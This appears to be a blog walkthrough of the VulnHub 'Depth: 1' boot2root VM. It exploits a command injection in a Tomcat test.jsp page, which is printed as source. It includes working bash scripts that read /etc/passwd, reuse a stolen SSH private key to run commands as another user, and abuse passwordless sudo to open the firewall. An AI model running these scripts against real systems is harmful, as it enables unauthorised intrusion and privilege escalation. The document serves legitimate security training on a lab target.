---
layout: post
title: "Deep Abyss"
category: Walkthrough
tags: [VulnHub, Depth]
comments: true
---

This post documents the complete walkthrough of Depth: 1, a boot2root [VM][1] created by [Dan Lawson][2] and hosted at [VulnHub][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

### Background

In Dan's own words:

>Many times while conducting a pentest, I need to script something up to make my life easier or to quickly test an attack idea or vector. Recently I came across an interesting command injection vector on a web application sitting on a client's internet-facing estate. There was a page, running in Java, that allowed me to type arbitrary commands into a form, and have it execute them. While developer-provided webshells are always nice, there were a few caveats. The page was expecting directory listing style output, which was then parsed and reformatted. If the output didn't match this parsing, no output to me. Additionally, there was no egress. ICMP, and all TCP/UDP ports including DNS were blocked outbound.
 
>I was still able to leverage the command injection to compromise not just the server, but the entire infrastructure it was running on. After the dust settled, the critical report was made, and the vulnerability was closed, I thought the entire attack path was kind of fun, and decided to share how I went about it. Since I enjoy being a free man and only occasionally visit prisons, I've created a simple boot2root style VM that has a similar set of vulnerabilities to use in a walkthrough.
  
### Information Gathering

Let's kick this off with a `nmap` scan to establish the services available in **b2r**:

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.100.4
...
PORT     STATE SERVICE REASON         VERSION
8080/tcp open  http    syn-ack ttl 64 Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|   Supported Methods: GET HEAD POST PUT DELETE OPTIONS
|_  Potentially risky methods: PUT DELETE
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat
```

Only one open port?! Well, I guess I have to brute force my way to an attack surface!

### Directory/File Enumeration

Let's start with directory/file enumeration using `wfuzz` with its associated wordlists.

```
# wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt -w /usr/share/wfuzz/wordlist/general/extensions_common.txt -c --hc 404 http://192.168.100.4:8080/FUZZFUZ2Z
********************************************************
* Wfuzz 2.2.9 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.100.4:8080/FUZZFUZ2Z
Total requests: 26600

==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================

012247:  C=200     29 L	     211 W	   1896 Ch	  "index - .html"
014532:  C=302      0 L	       0 W	      0 Ch	  "manager - /"
023339:  C=200     21 L	      59 W	    573 Ch	  "test - .jsp"

Total time: 72.76834
Processed Requests: 26600
Filtered Requests: 26597
Requests/sec.: 365.5435
```

### File Listing Checker

This is what I see when I navigated to `http://192.168.100.4:8080/test.jsp` with a browser.

![screenshot-1](/assets/images/posts/depth-walkthrough/screenshot-1.png)

After some tinkering with `test.jsp` to solicit output, I observed that command execution is possible but output from the command must conform to the following:

* Output must not be empty; and
* Output must be more than 8 tokens, delimited by one or more space; and
* Only token 2, 3, 4 and 8+ are displayed in a HTML table.

I was able to leverage on `hexdump` to act like `cat` to display `/etc/passwd` like so.

![screenshot-2](/assets/images/posts/depth-walkthrough/screenshot-2.png)

I wrote `cat.sh` to extract and display the printable ASCII characters.

{% highlight bash linenos %}
# cat cat.sh
#!/bin/bash

_HOST=192.168.100.4
_PORT=8080
_TEST=test.jsp
_PATH=path
__CAT="hexdump -C "
__CMD="${__CAT}$1"

urlencode() {
    old_lc_collate=$LC_COLLATE
    LC_COLLATE=C

    local length="${#1}"
    for (( i = 0; i < length; i++ )); do
        local c="${1:i:1}"
        case $c in
            [a-zA-Z0-9.~_-]) printf "$c" ;;
            *) printf '%%%02X' "'$c" ;;
        esac
    done

    LC_COLLATE=$old_lc_collate
}

CMD=$(urlencode "$__CMD")

curl -s $_HOST:$_PORT/$_TEST?$_PATH=$CMD \
| grep '|' \
| cut -d'|' -f2 \
| tr -d '\n' \
| tr '.' '\n'
{% endhighlight %}

This is how `/etc/passwd` (only the ones of interest are shown) looked like.

```
# ./cat.sh /etc/passwd
...
tomcat8:x:112:115::/usr/share/tomcat8:/bin/false
bill:x:1000:1000:bill,,,:/home/bill:/bin/bash
```

This is how their respective home directories looked like.

![screenshot-5](/assets/images/posts/depth-walkthrough/screenshot-5.png)

Noticed that `tomcat8` has a `.ssh` directory?

![screenshot-4](/assets/images/posts/depth-walkthrough/screenshot-4.png)

Noticed `bill` is on the `sudoers` list? And this is how `test.jsp` (only the JSP portion is shown) looked like.

{% highlight jsp linenos %}
# ./cat.sh ./webapps/ROOT/test.jsp
<%@ page import="java.util.*,java.io.*,java.util.regex.*"%>
...
<%
    if (request.getParameter("path") != null) {
        String delims = "[ ]+";
        out.println("Command: " + request.getParameter("path") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("path"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        out.println("<table border='1'><tr><th>Owner</th><th>Group</th><th>Size</th><th>Filename</th></tr>");

        String disr = dis.readLine();
        while ( disr != null ) {
            String[] tokens = disr.split(delims);

            if (tokens.length > 8) {
                out.println("<tr>");
                out.println("<td>" + tokens[2] + "</td>");
                out.println("<td>" + tokens[3] + "</td>");
                out.println("<td>" + tokens[4] + "</td>");
                String[] filename = Arrays.copyOfRange(tokens, 8, tokens.length);
                String fname = String.join(" ", filename);
                out.println("<td>" + fname + "</td>");
                out.println("</tr>");

                //out.println(tokens.length);
                //out.println(disr);
                disr = dis.readLine(); 
            } else {
                disr =dis.readLine();
            }
        }
        out.println("</table>");

    }
%>
{% endhighlight %}

Fortunately, I was able to run `ps faux` and noticed that `sshd` was running. Moreover, `ufw` was also validated to be running through displaying `/etc/ufw/ufw.conf`.

```
# ./cat.sh /etc/ufw/ufw.conf
# /etc/ufw/ufw.conf
#

# Set to yes to start on boot If setting this remotely, be sure to add a rule
# to allow your remote connection before starting ufw. Eg: 'ufw allow 22/tcp'
ENABLED=yes

# Please use the 'ufw' command to set the loglevel. Eg: 'ufw logging medium'
# See 'man ufw' for details.
LOGLEVEL=low
```

That explained why there was only one open port from the earlier `nmap` scan. SSH was probably blocked by the firewall.

### The Key to a Man's Heart Is Through His Stomach

With a script like `cat.sh`, combined with directory listing from `test.jsp`, I was able to discover and extract `tomcat8`'s SSH key pair at its home directory from `/etc/passwd`.

![screenshot-3](/assets/images/posts/depth-walkthrough/screenshot-3.png)

I took an educated guess, put two and two together and gathered that `tomcat8` probably had its public key listed in `/home/bill/.ssh/authorized_keys`. If there's the case, I should be able to login to `bill`'s account via SSH in **localhost**. Well, there's only one way to find out. As Yoda put it, "**_Do. Or do not. There is no try._**"

### Kill Bill: Vol. 1

I knew one can login via SSH and execute a command. Let's validate I'm indeed logged in as `bill` with `tomcat8`'s private key.

![screenshot-6](/assets/images/posts/depth-walkthrough/screenshot-6.png)

Holy smoke. I can execute remote commands! Moreover, I was able to overcome the output display restrictions by adding my own placeholders.

With this in mind, I wrote `cmd.sh`, a script that displayed the proper output from the commands as if executed by `bill` in a shell.

{% highlight bash linenos %}
# cat cmd.sh
#!/bin/bash

_HOST=192.168.100.4
_PORT=8080
_TEST=test.jsp
_PATH=path
__KEY=/usr/share/tomcat8/.ssh/id_rsa
__SSH="ssh -i $__KEY bill@localhost"
__SEQ="echo 0 1 2 3 4 5 6 7"
__CMD="$__SSH sh -c '$__SEQ XXX$1 | base64XXX' "

urlencode() {
    old_lc_collate=$LC_COLLATE
    LC_COLLATE=C

    local length="${#1}"
    for (( i = 0; i < length; i++ )); do
        local c="${1:i:1}"
        case $c in
            [a-zA-Z0-9.~_-]) printf "$c" ;;
            *) printf '%%%02X' "'$c" ;;
        esac
    done

    LC_COLLATE=$old_lc_collate
}

CMD=$(urlencode "$__CMD")

curl -s $_HOST:$_PORT/$_TEST?$_PATH=${CMD//XXX/%60} \
| grep -P '^<td>' \
| sed -e '4!d' -e 's/^<td>//' -e 's/<\/td>$//' \
| tr ' ' '\n' \
| base64 -d
{% endhighlight %}

### Kill Bill: Vol. 2

Let's give it a spin.

```
# ./cmd.sh "sudo -l"
Matching Defaults entries for bill on b2r:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bill may run the following commands on b2r:
    (ALL : ALL) NOPASSWD: ALL
```

Just as expected. Let's abuse this privilege to enable SSH in the firewall and give myself a proper shell.

```
# ./cmd.sh "sudo ufw allow ssh"
Rule added
Rule added (v6)
```

From my attacking machine, I can now finally login as `bill`.

![screenshot-7](/assets/images/posts/depth-walkthrough/screenshot-7.png)

:dancer:

### What the Flag?

![screenshot-8](/assets/images/posts/depth-walkthrough/screenshot-8.png)

Well, that was not too difficult, was it?

[1]: https://www.vulnhub.com/entry/depth-1,213/
[2]: https://twitter.com/@fang0654
[3]: https://www.vulnhub.com
